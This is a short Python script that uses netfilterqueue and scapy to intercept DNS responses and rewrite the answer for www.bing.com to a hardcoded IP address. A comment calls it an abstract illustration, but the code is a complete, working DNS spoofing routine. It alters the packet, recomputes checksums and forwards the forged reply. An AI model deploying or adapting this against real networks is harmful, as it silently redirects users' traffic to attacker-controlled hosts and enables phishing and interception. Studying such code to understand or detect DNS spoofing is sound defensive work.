from netfilterqueue import NetfilterQueue
import scapy.all as scapy

# This script just for abstract the idea for dns spoofing not to make the real dns spoof
def on_packet_coming(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())
    if scapy_pkt.haslayer(scapy.DNSRR):
        q_name = scapy_pkt[scapy.DNSQR].qname
        if b'www.bing.com.' == q_name:
            print("yes")
            answer = scapy.DNSRR(rrname=q_name, rdata='102.132.97.35')
            scapy_pkt[scapy.DNS].an = answer
            scapy_pkt[scapy.DNS].ancount = 1
            del scapy_pkt[scapy.IP].len
            del scapy_pkt[scapy.IP].chksum
            del scapy_pkt[scapy.UDP].len
            del scapy_pkt[scapy.UDP].chksum

            pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()


queue = NetfilterQueue()
queue.bind(0, user_callback=on_packet_coming)
queue.run()
